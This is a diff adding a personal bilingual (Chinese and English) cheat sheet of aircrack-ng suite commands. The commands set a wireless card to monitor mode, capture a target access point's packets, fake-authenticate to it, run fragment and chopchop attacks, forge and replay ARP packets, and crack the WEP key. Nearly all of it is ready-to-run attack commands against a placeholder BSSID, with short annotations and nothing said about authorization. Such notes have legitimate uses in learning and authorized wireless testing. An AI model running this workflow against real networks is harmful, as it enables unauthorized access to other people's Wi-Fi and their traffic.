@@ -1,0 +1,55 @@
+使用紀錄 | Use history
+	airmon-ng
+		啟動無線網路介面wlan0監聽封包模式
+			airmon-ng start wlan0
+		啟動無線網路介面wlan0監聽封包模式並鎖定(?)頻道11
+			airmon-ng start wlan0 11
+		停用無線網路介面mon0監聽封包模式
+			airmon-ng stop mon0
+	airodump-ng
+		偵測無線網路介面mon0監聽到的Access Point的狀態
+			airodump-ng mon0
+			airodump-ng --channel 11 mon0
+				--channel 11
+					鎖定偵測11頻道
+		dump無線網路介面mon0監聽到的封包
+			airodump-ng --channel 11 --bssid 01:23:45:67:89:AB -w target_AP_dump.binary mon0
+	aireplay-ng
+		注入封包測試 | injection test
+			aireplay-ng -9 -e target_AP -a 01:23:45:67:89:AB mon0
+				-9
+					injection test
+				-e target_AP
+					[replay]選擇ESSID為target_AP的Access Point
+				-a 01:23:45:67:89:AB
+					[replay]目標Access Point的BSSID
+				mon0
+					無線網路介面裝置名稱
+		欺騙AP使自己的無線網路介面authenticated
+			aireplay-ng --fakeauth 0 -e target_AP -a 01:23:45:67:89:AB -h CD:EF:01:23:45:67 mon0
+				--fakeauth 0
+				-a 01:23:45:67:89:AB
+					[replay]目標Access Point的BSSID
+				-h CD:EF:01:23:45:67
+					要被authenticate的無線網路介面的MAC位址
+		攻擊方式(?)
+			Fragment Attack
+				aireplay-ng -5 -b 01:23:45:67:89:AB -h CD:EF:01:23:45:67 mon0
+					-5
+						指定進行Fragment Attack
+					-b 01:23:45:67:89:AB
+						[filter]目標Access Point的BSSID
+			chopchop Attack
+				aireplay-ng -4 -b 01:23:45:67:89:AB -h CD:EF:01:23:45:67 mon0
+					-4
+						指定進行chopchop Attack
+					-b 01:23:45:67:89:AB
+						[filter]目標Access Point的BSSID
+		replay ARP request封包(?)
+			aireplay-ng -2 -r target_AP-arp-request.binary mon0
+	packetforge-ng
+		利用攻擊產生的檔案產生用於ARP攻擊的封包的樣子
+			packetforge-ng -0 -a 01:23:45:67:89:AB -h CD:EF:01:23:45:67 -k 255.255.255.255 -l 255.255.255.255 -y fragment-1234-123456.xor -w target_AP-arp-request.binary
+	aircrack-ng
+		利用dump出來的封包進行破解
+			aircrack-ng -z -b 01:23:45:67:89:AB target_AP_output-*.cap
